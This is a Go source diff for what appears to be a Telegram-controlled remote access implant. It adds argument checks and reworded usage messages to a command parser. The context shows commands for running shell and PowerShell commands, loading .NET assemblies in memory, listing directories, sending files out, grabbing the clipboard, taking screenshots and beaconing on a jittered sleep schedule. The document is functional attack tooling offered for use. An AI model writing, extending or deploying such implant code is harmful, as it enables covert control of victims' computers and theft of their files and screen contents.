@@ -10,7 +10,6 @@ import (
 )
 
 var (
-	noSuchCommand = "No such command 🥴"
 	//go:embed Config/sleep_time
 	sleep_time string
 	//go:embed Config/sleep_time_jitter
@@ -33,20 +32,40 @@ func parseCommand(chatID int64, text string) {
 	case "/info":
 		getInfo(chatID)
 	case "/cmd":
+		if len(commandParts) == 1 {
+			SendMessage(chatID, "No command supplied. \nUsage: /cmd <shell-command>")
+			return
+		}
 		executeCommand(chatID, commandParts[1:])
 	case "/showdir":
+		if len(commandParts) == 1 {
+			SendMessage(chatID, "No directory supplied. \nUsage: /showdir <dir-path>")
+			return
+		}
 		showDir(chatID, strings.Trim(strings.Join(commandParts[1:], " "), `"'`))
 	case "/down":
+		if len(commandParts) == 1 {
+			SendMessage(chatID, "No file path supplied. \nUsage: /down <file-path>")
+			return
+		}
 		wrapSendFile(chatID, strings.Trim(strings.Join(commandParts[1:], " "), `"'`))
 	case "/clip":
 		getClipboard(chatID)
 	case "/screen":
 		takeScreenshots(chatID)
 	case "/asm":
+		if len(commandParts) > 2 {
+			SendMessage(chatID, "Wrong usage. Usage: /asm <assembly-file|assembly-hash> <assembly-params>")
+			return
+		}
 		assemblyHash := commandParts[1]
 		assemblyArgs := commandParts[2:]
 		executeAssemblyByHash(chatID, assemblyHash, assemblyArgs, "")
 	case "/iex":
+		if len(commandParts) == 1 {
+			SendMessage(chatID, "No command supplied. \nUsage: /iex <powershell-command>")
+			return
+		}
 		scriptBlock := []string{"return"}
 		scriptBlockStr := strings.TrimSpace(strings.Join(commandParts[1:], " "))
 		if scriptBlockStr != "" {
@@ -60,14 +79,14 @@ func parseCommand(chatID int64, text string) {
 		os.Exit(0)
 	case "/sleep":
 		if len(commandParts) != 3 {
-			SendMessage(chatID, "Wrong number of /sleep arguments")
+			SendMessage(chatID, "Wrong usage. \nUsage: /sleep <seconds-to-sleep> <sleep-jitter-%>")
 			return
 		}
 		// Here we convert only to validate the arguments, it's converted while sleeping again
 		_, err_st := strconv.Atoi(commandParts[1])
 		_, err_sj := strconv.Atoi(commandParts[2])
 		if (err_st != nil) || (err_sj != nil) {
-			SendMessage(chatID, "Wrong /sleep arguments")
+			SendMessage(chatID, "Wrong usage. /sleep <seconds-to-sleep> <sleep-jitter-%>")
 			return
 		}
 		sleep_time = commandParts[1]
@@ -75,7 +94,7 @@ func parseCommand(chatID int64, text string) {
 		SendMessage(chatID, "Sleep changed")
 
 	default:
-		SendMessage(chatID, noSuchCommand)
+		SendMessage(chatID, "No such command 🥴")
 	}
 }
 
@@ -113,7 +132,7 @@ func parseFileCommand(chatID int64, file *Document, caption string) {
 		}
 		SendMessage(chatID, responseText)
 	} else {
-		SendMessage(chatID, noSuchCommand)
+		SendMessage(chatID, "No such command 🥴")
 	}
 }
 
